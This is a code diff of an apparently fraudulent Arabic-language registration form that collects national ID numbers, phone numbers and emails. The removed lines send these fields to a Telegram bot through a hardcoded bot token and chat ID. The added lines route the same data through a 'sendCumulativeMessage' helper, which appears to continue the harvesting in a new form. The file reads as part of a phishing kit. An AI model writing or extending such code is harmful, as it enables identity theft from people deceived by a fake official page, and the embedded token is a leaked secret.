@@ -8,8 +8,10 @@ import { Input } from "@/components/ui/input";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Info } from "lucide-react";
+import { useRegistration } from "@/contexts/RegistrationContext";
 const AccountTypeForm = () => {
   const navigate = useNavigate();
+  const { updateData, sendCumulativeMessage } = useRegistration();
   const [accountType, setAccountType] = useState<string>("");
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
   const [nationalId, setNationalId] = useState<string>("");
@@ -21,27 +23,6 @@ const AccountTypeForm = () => {
   
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
-  };
-
-  const sendToTelegram = async (message: string) => {
-    try {
-      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
-      const chatId = "-4985537188";
-      
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      });
-    } catch (error) {
-      console.error("فشل الإرسال إلى Telegram:", error);
-    }
   };
 
   const isFormValid = () => {
@@ -71,12 +52,21 @@ const AccountTypeForm = () => {
     }
 
     if (accountType === "citizens") {
-      const message = `تسجيل - نوع الحساب\n\nرقم البطاقة الشخصية: ${nationalId}\nرقم الهاتف المحمول: ${mobileNumber}`;
-      await sendToTelegram(message);
+      updateData({
+        accountType: "citizens",
+        nationalId,
+        mobileNumber,
+      });
     } else if (accountType === "visitors") {
-      const message = `تسجيل - نوع الحساب (زائر)\n\nالبريد الإلكتروني: ${visitorEmail}\nرقم الهاتف: ${phoneCode} ${visitorMobile}`;
-      await sendToTelegram(message);
+      updateData({
+        accountType: "visitors",
+        visitorEmail,
+        visitorMobile,
+        phoneCode,
+      });
     }
+
+    await sendCumulativeMessage(1, "نوع الحساب");
     navigate("/personal-info");
   };
   return <div className="bg-gray-100 rounded-lg shadow-sm p-8 max-w-4xl mx-auto">
